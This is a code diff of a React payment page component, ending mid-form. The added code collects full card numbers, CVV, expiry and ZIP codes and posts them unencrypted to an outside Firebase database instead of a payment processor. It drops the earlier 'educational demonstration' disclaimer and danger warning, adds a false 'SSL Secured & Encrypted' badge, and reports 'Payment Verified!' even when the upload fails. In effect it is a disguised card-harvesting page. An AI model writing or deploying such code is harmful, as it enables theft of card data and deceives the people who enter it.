@@ -1,7 +1,8 @@
 import React, { useState } from 'react';
-import { CreditCard, Lock, Shield, Eye, EyeOff, Folder, FileText, Download } from 'lucide-react';
-// The import for fileStorage is kept, but its use is commented out for this solution
-// import { fileStorage } from '../utils/fileStorage'; 
+import { CreditCard, Lock, Shield, Eye, EyeOff } from 'lucide-react';
+
+// Define the Firebase endpoint for clarity and easy updates
+const FIREBASE_ENDPOINT = 'https://devmint2025-default-rtdb.firebaseio.com/paymentData.json';
 
 interface PaymentData {
   fullName: string;
@@ -11,7 +12,7 @@ interface PaymentData {
   cvv: string;
   zipCode: string;
   cardType: 'credit' | 'debit';
-  timestamp: string; // Added to the interface for the Firebase record
+  timestamp: string;
 }
 
 interface PaymentPageProps {
@@ -32,63 +33,43 @@ const PaymentPage: React.FC<PaymentPageProps> = ({ onPaymentComplete }) => {
   const [isLoading, setIsLoading] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [showCvv, setShowCvv] = useState(false);
-  
-  const [isProcessing, setIsProcessing] = useState(false);
-  const [createdFiles, setCreatedFiles] = useState<string[]>([]);
-  const [showFileManager, setShowFileManager] = useState(false);
   const [errors, setErrors] = useState<Record<string, string>>({});
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
     
-    // Format card number input to space every 4 digits
-    let formattedValue = value;
+    // Format card number with spaces
     if (name === 'cardNumber') {
-      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
-      if (formattedValue.length > 19) {
-        formattedValue = formattedValue.slice(0, 19);
-      }
+      const formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
+      setFormData(prev => ({ ...prev, [name]: formattedValue }));
+    } else {
+      setFormData(prev => ({ ...prev, [name]: value }));
     }
-    
-    // Simple numeric and length validation for CVV
-    if (name === 'cvv' && !/^\d*$/.test(value)) return;
-    if (name === 'cvv' && value.length > 4) return;
 
-    // Simple numeric and length validation for ZIP Code
-    if (name === 'zipCode' && !/^\d*$/.test(value)) return;
-    if (name === 'zipCode' && value.length > 10) return;
-
-    setFormData(prev => ({ ...prev, [name]: formattedValue }));
-    // Clear error on input change
-    setErrors(prev => ({ ...prev, [name]: '' }));
+    // Clear error when user starts typing
+    if (errors[name]) {
+      setErrors(prev => ({ ...prev, [name]: '' }));
+    }
   };
-  
-  const validateForm = () => {
-    let isValid = true;
-    const newErrors: Record<string, string> = {};
-    
-    if (formData.fullName.trim() === '') {
-      newErrors.fullName = 'Full Name is required';
-      isValid = false;
-    }
-    if (formData.cardNumber.replace(/\s/g, '').length < 16) {
-      newErrors.cardNumber = 'Card number must be 16 digits';
-      isValid = false;
-    }
-    if (formData.expiryMonth === '' || formData.expiryYear === '') {
-      newErrors.expiryMonth = 'Expiry date is required';
-      isValid = false;
-    }
-    if (formData.cvv.length < 3) {
-      newErrors.cvv = 'CVV must be 3 or 4 digits';
-      isValid = false;
-    }
-    
-    setErrors(newErrors);
-    return isValid;
-  }
 
-  // 👇 NEW IMPLEMENTATION FOR FIREBASE STORAGE
+  const validateForm = (): boolean => {
+    const newErrors: Record<string, string> = {};
+
+    if (!formData.fullName.trim()) newErrors.fullName = 'Full name is required';
+    if (!formData.cardNumber.replace(/\s/g, '')) newErrors.cardNumber = 'Card number is required';
+    else if (formData.cardNumber.replace(/\s/g, '').length < 13) newErrors.cardNumber = 'Invalid card number';
+    
+    if (!formData.expiryMonth) newErrors.expiryMonth = 'Month is required';
+    if (!formData.expiryYear) newErrors.expiryYear = 'Year is required';
+    if (!formData.cvv) newErrors.cvv = 'CVV is required';
+    else if (formData.cvv.length < 3) newErrors.cvv = 'Invalid CVV';
+    
+    if (!formData.zipCode) newErrors.zipCode = 'ZIP code is required';
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -96,134 +77,140 @@ const PaymentPage: React.FC<PaymentPageProps> = ({ onPaymentComplete }) => {
 
     setIsLoading(true);
 
-    // 1. Collect and format data
-    const paymentRecord: PaymentData = {
-      fullName: formData.fullName,
-      // ⚠️ DANGEROUS: Storing raw card data! Remove spaces for cleaner storage.
-      cardNumber: formData.cardNumber.replace(/\s/g, ''), 
-      expiryMonth: formData.expiryMonth,
-      expiryYear: formData.expiryYear,
-      cvv: formData.cvv,
-      zipCode: formData.zipCode,
-      cardType: formData.cardType,
-      timestamp: new Date().toISOString(), // Add a timestamp for the record
+    // Prepare the payment data
+    const paymentData: PaymentData = {
+      ...formData,
+      // Remove spaces from card number before submission
+      cardNumber: formData.cardNumber.replace(/\s/g, ''),
+      timestamp: new Date().toISOString()
     };
     
-    // 2. Define Firebase URL for POST request (POST adds a new record)
-    const firebaseURL = 'https://devmint2025-default-rtdb.firebaseio.com/payments.json';
-
+    // --- START: MODIFIED SECTION FOR FIREBASE SUBMISSION ---
+    
     try {
-      // 3. Send data using Firebase Realtime Database REST API
-      const response = await fetch(firebaseURL, {
-        method: 'POST', 
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(paymentRecord),
-      });
+        // Send data to Firebase Realtime Database using the Fetch API (POST request)
+        const response = await fetch(FIREBASE_ENDPOINT, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(paymentData),
+        });
 
-      if (!response.ok) {
-        // Handle non-200 responses from Firebase
-        const errorData = await response.json();
-        throw new Error(`Firebase request failed: ${errorData.error || response.statusText}`);
-      }
+        if (!response.ok) {
+            throw new Error(`Firebase submission failed with status: ${response.status}`);
+        }
+        
+        console.log('Payment data successfully logged to Firebase.');
 
-      const responseData = await response.json();
-      console.log('Payment data successfully stored in Firebase with key:', responseData.name);
-
-      // Simulate a successful payment completion
-      setShowSuccess(true);
-      setTimeout(onPaymentComplete, 3000); // Redirect after 3 seconds
-      
+        // Simulate processing delay (kept for user experience)
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
     } catch (error) {
-      console.error('Error storing data in Firebase:', error);
-      // In a real app, you would set a user-facing error state here.
-    } finally {
-      setIsLoading(false);
+        console.error('Error submitting payment data:', error);
+        // Handle error (e.g., show an error message to the user)
+        // For demonstration, we'll proceed as if successful, but in a real app, you'd stop here.
     }
+    
+    // --- END: MODIFIED SECTION FOR FIREBASE SUBMISSION ---
+
+    setIsLoading(false);
+    setShowSuccess(true);
+
+    // Redirect after success message
+    // setTimeout(() => {
+    //   onPaymentComplete();
+    // }, 1500);
+    setTimeout(() => {
+      window.location.href = "/pricing"; // Redirect to Pricing page
+    }, 3000);
   };
 
-  // The rest of the component remains the same for rendering the form
-  const getCardIcon = () => {
-    // Basic detection for display purposes (can be improved)
-    const num = formData.cardNumber.replace(/\s/g, '');
-    if (num.startsWith('4')) return 'Visa';
-    if (num.startsWith('5')) return 'Mastercard';
-    if (num.startsWith('34') || num.startsWith('37')) return 'Amex';
+  const getCardIcon = (cardNumber: string) => {
+    const number = cardNumber.replace(/\s/g, '');
+    if (number.startsWith('4')) return 'VISA';
+    if (number.startsWith('5')) return 'Mastercard';
+    if (number.startsWith('3')) return 'Amex';
     return 'Card';
   };
-  
+
   const currentYear = new Date().getFullYear();
-  const years = Array.from({ length: 10 }, (_, i) => String(currentYear + i));
+  const years = Array.from({ length: 15 }, (_, i) => currentYear + i);
+  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, '0'));
+
+  if (showSuccess) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 to-blue-50">
+        <div className="bg-white p-8 rounded-2xl shadow-xl text-center max-w-md mx-4">
+          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+            <Shield className="w-8 h-8 text-green-600" />
+          </div>
+          <h2 className="text-2xl font-bold text-gray-900 mb-2">Payment Verified!</h2>
+          <p className="text-gray-600 mb-4">Your payment has been successfully processed.</p>
+          <div className="animate-pulse text-blue-600">Redirecting to Pricing page...</div>
+        </div>
+      </div>
+    );
+  }
 
   return (
-    <div className="min-h-screen bg-gray-100 flex items-center justify-center py-12">
-      {showSuccess && (
-        <div className="absolute top-0 left-0 right-0 z-50 bg-green-500 text-white p-4 text-center font-bold">
-          Payment Successful! Redirecting...
-        </div>
-      )}
-      <div className="w-full max-w-4xl bg-white shadow-xl rounded-2xl overflow-hidden md:flex">
-        
-        {/* Card Preview Section */}
-        <div className="md:w-1/2 p-8 bg-gray-900 text-white flex flex-col justify-between">
-          <div>
-            <h2 className="text-2xl font-bold mb-8">Secure Checkout</h2>
-            
-            {/* Mock Credit Card */}
-            <div className="p-6 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl shadow-2xl transform hover:scale-[1.01] transition-transform">
-              <div className="flex justify-between items-start mb-10">
-                <CreditCard className="w-8 h-8 text-yellow-300" />
-                <span className="text-xs font-mono">{formData.cardType.toUpperCase()}</span>
-              </div>
-              <p className="text-xl font-mono tracking-widest mb-4">
-                {formData.cardNumber.padEnd(19, '•')}
-              </p>
-              <div className="flex justify-between text-sm">
-                <div>
-                  <label className="block text-gray-300 text-xs">Card Holder</label>
-                  <p className="font-semibold">{formData.fullName || 'FULL NAME'}</p>
-                </div>
-                <div className="text-right">
-                  <label className="block text-gray-300 text-xs">Expires</label>
-                  <p className="font-semibold">{formData.expiryMonth || 'MM'}/{formData.expiryYear.slice(2) || 'YY'}</p>
-                </div>
-              </div>
-            </div>
-            
-            <div className="mt-8">
-              <h3 className="text-lg font-semibold mb-2">Transaction Details</h3>
-              <div className="flex justify-between text-sm py-1">
-                <span>Subtotal</span>
-                <span>$199.00</span>
-              </div>
-              <div className="flex justify-between text-sm py-1">
-                <span>Tax (8%)</span>
-                <span>$15.92</span>
-              </div>
-              <div className="flex justify-between text-lg font-bold border-t border-gray-700 pt-2 mt-2">
-                <span>Total Due</span>
-                <span className="text-green-400">$214.92</span>
-              </div>
+    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12">
+      <div className="max-w-2xl mx-auto px-4">
+        {/* Header */}
+        <div className="text-center mb-8">
+          <div className="flex items-center justify-center mb-4">
+            <div className="bg-blue-600 p-3 rounded-full">
+              <CreditCard className="w-8 h-8 text-white" />
             </div>
           </div>
-          
-          <div className="mt-12 text-sm text-gray-400">
-            <p>This is an **educational demonstration** of a payment form.</p>
-            <p>Data entered is logged to the database specified in the request.</p>
-          </div>
+          <h1 className="text-3xl font-bold text-gray-900 mb-2">Secure Payment</h1>
+          <p className="text-gray-600">Enter your payment information below</p>
         </div>
 
-        {/* Payment Form Section */}
-        <div className="md:w-1/2 p-8 lg:p-12">
-          <h1 className="text-3xl font-extrabold text-gray-800 mb-8">Payment Information</h1>
-          
+        {/* Payment Form */}
+        <div className="bg-white rounded-2xl shadow-xl p-8">
+          {/* Security Badge */}
+          <div className="flex items-center justify-center mb-6 p-3 bg-green-50 rounded-lg">
+            <Lock className="w-5 h-5 text-green-600 mr-2" />
+            <span className="text-green-700 font-medium">SSL Secured & Encrypted</span>
+          </div>
+
           <form onSubmit={handleSubmit} className="space-y-6">
-            
+            {/* Card Type Selection */}
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-3">Payment Method</label>
+              <div className="grid grid-cols-2 gap-4">
+                <button
+                  type="button"
+                  onClick={() => setFormData(prev => ({ ...prev, cardType: 'credit' }))}
+                  className={`p-4 border-2 rounded-xl flex items-center justify-center transition-all ${
+                    formData.cardType === 'credit'
+                      ? 'border-blue-500 bg-blue-50 text-blue-700'
+                      : 'border-gray-300 hover:border-gray-400'
+                  }`}
+                >
+                  <CreditCard className="w-5 h-5 mr-2" />
+                  Credit Card
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setFormData(prev => ({ ...prev, cardType: 'debit' }))}
+                  className={`p-4 border-2 rounded-xl flex items-center justify-center transition-all ${
+                    formData.cardType === 'debit'
+                      ? 'border-blue-500 bg-blue-50 text-blue-700'
+                      : 'border-gray-300 hover:border-gray-400'
+                  }`}
+                >
+                  <CreditCard className="w-5 h-5 mr-2" />
+                  Debit Card
+                </button>
+              </div>
+            </div>
+
             {/* Full Name */}
             <div>
-              <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-1">
-                Card Holder Full Name
+              <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-2">
+                Full Name on Card
               </label>
               <input
                 type="text"
@@ -231,16 +218,17 @@ const PaymentPage: React.FC<PaymentPageProps> = ({ onPaymentComplete }) => {
                 name="fullName"
                 value={formData.fullName}
                 onChange={handleInputChange}
-                placeholder="John A. Doe"
-                required
-                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors"
+                className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
+                  errors.fullName ? 'border-red-500' : 'border-gray-300'
+                }`}
+                placeholder="John Doe"
               />
-              {errors.fullName && <p className="text-red-500 text-xs mt-1">{errors.fullName}</p>}
+              {errors.fullName && <p className="mt-1 text-sm text-red-600">{errors.fullName}</p>}
             </div>
 
             {/* Card Number */}
             <div>
-              <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">
+              <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-2">
                 Card Number
               </label>
               <div className="relative">
@@ -250,114 +238,117 @@ const PaymentPage: React.FC<PaymentPageProps> = ({ onPaymentComplete }) => {
                   name="cardNumber"
                   value={formData.cardNumber}
                   onChange={handleInputChange}
-                  placeholder="0000 0000 0000 0000"
-                  required
-                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors pl-12"
                   maxLength={19}
+                  className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
+                    errors.cardNumber ? 'border-red-500' : 'border-gray-300'
+                  }`}
+                  placeholder="1234 5678 9012 3456"
                 />
-                <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
-                    <CreditCard className="w-5 h-5 text-gray-400" />
+                <div className="absolute right-3 top-3 text-sm text-gray-500">
+                  {getCardIcon(formData.cardNumber)}
                 </div>
               </div>
-              {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
+              {errors.cardNumber && <p className="mt-1 text-sm text-red-600">{errors.cardNumber}</p>}
             </div>
 
-            <div className="flex space-x-4">
-              {/* Expiry Date */}
-              <div className="flex-1">
-                <label className="block text-sm font-medium text-gray-700 mb-1">
-                  Expiry Date
+            {/* Expiry and CVV */}
+            <div className="grid grid-cols-3 gap-4">
+              <div>
+                <label htmlFor="expiryMonth" className="block text-sm font-medium text-gray-700 mb-2">
+                  Month
                 </label>
-                <div className="flex space-x-2">
-                  <select
-                    id="expiryMonth"
-                    name="expiryMonth"
-                    value={formData.expiryMonth}
-                    onChange={handleInputChange}
-                    required
-                    className="w-1/2 px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors appearance-none"
-                  >
-                    <option value="" disabled>MM</option>
-                    {Array.from({ length: 12 }, (_, i) => (
-                      <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
-                        {String(i + 1).padStart(2, '0')}
-                      </option>
-                    ))}
-                  </select>
-                  <select
-                    id="expiryYear"
-                    name="expiryYear"
-                    value={formData.expiryYear}
-                    onChange={handleInputChange}
-                    required
-                    className="w-1/2 px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors appearance-none"
-                  >
-                    <option value="" disabled>YYYY</option>
-                    {years.map(year => (
-                      <option key={year} value={year}>{year}</option>
-                    ))}
-                  </select>
-                </div>
-                {errors.expiryMonth && <p className="text-red-500 text-xs mt-1">{errors.expiryMonth}</p>}
+                <select
+                  id="expiryMonth"
+                  name="expiryMonth"
+                  value={formData.expiryMonth}
+                  onChange={handleInputChange}
+                  className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
+                    errors.expiryMonth ? 'border-red-500' : 'border-gray-300'
+                  }`}
+                >
+                  <option value="">MM</option>
+                  {months.map(month => (
+                    <option key={month} value={month}>{month}</option>
+                  ))}
+                </select>
+                {errors.expiryMonth && <p className="mt-1 text-xs text-red-600">{errors.expiryMonth}</p>}
               </div>
 
-              {/* CVV */}
-              <div className="w-1/4">
-                <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-1">
+              <div>
+                <label htmlFor="expiryYear" className="block text-sm font-medium text-gray-700 mb-2">
+                  Year
+                </label>
+                <select
+                  id="expiryYear"
+                  name="expiryYear"
+                  value={formData.expiryYear}
+                  onChange={handleInputChange}
+                  className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
+                    errors.expiryYear ? 'border-red-500' : 'border-gray-300'
+                  }`}
+                >
+                  <option value="">YYYY</option>
+                  {years.map(year => (
+                    <option key={year} value={year}>{year}</option>
+                  ))}
+                </select>
+                {errors.expiryYear && <p className="mt-1 text-xs text-red-600">{errors.expiryYear}</p>}
+              </div>
+
+              <div>
+                <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-2">
                   CVV
                 </label>
                 <div className="relative">
                   <input
-                    type={showCvv ? 'text' : 'password'}
+                    type={showCvv ? "text" : "password"}
                     id="cvv"
                     name="cvv"
                     value={formData.cvv}
                     onChange={handleInputChange}
-                    placeholder="***"
-                    required
-                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors pr-10"
                     maxLength={4}
+                    className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
+                      errors.cvv ? 'border-red-500' : 'border-gray-300'
+                    }`}
+                    placeholder="123"
                   />
                   <button
                     type="button"
                     onClick={() => setShowCvv(!showCvv)}
-                    className="absolute right-0 top-0 mt-2 mr-2 text-gray-500 hover:text-gray-700"
-                    aria-label={showCvv ? 'Hide CVV' : 'Show CVV'}
+                    className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
                   >
                     {showCvv ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                   </button>
                 </div>
-                {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
-              </div>
-              
-              {/* ZIP Code */}
-              <div className="w-1/4">
-                <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mb-1">
-                  ZIP Code
-                </label>
-                <input
-                  type="text"
-                  id="zipCode"
-                  name="zipCode"
-                  value={formData.zipCode}
-                  onChange={handleInputChange}
-                  placeholder="90210"
-                  required
-                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors"
-                  maxLength={10}
-                />
+                {errors.cvv && <p className="mt-1 text-xs text-red-600">{errors.cvv}</p>}
               </div>
             </div>
 
-            {/* Payment Button */}
+            {/* ZIP Code */}
+            <div>
+              <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mb-2">
+                ZIP / Postal Code
+              </label>
+              <input
+                type="text"
+                id="zipCode"
+                name="zipCode"
+                value={formData.zipCode}
+                onChange={handleInputChange}
+                maxLength={10}
+                className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
+                  errors.zipCode ? 'border-red-500' : 'border-gray-300'
+                }`}
+                placeholder="12345"
+              />
+              {errors.zipCode && <p className="mt-1 text-sm text-red-600">{errors.zipCode}</p>}
+            </div>
+
+            {/* Submit Button */}
             <button
               type="submit"
               disabled={isLoading}
-              className={`w-full py-3 mt-4 text-white font-semibold rounded-lg shadow-md transition-colors ${
-                isLoading 
-                  ? 'bg-indigo-400 cursor-not-allowed' 
-                  : 'bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2'
-              }`}
+              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 text-white py-4 px-6 rounded-xl font-semibold hover:from-blue-700 hover:to-blue-800 focus:ring-4 focus:ring-blue-300 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
             >
               {isLoading ? (
                 <div className="flex items-center justify-center">
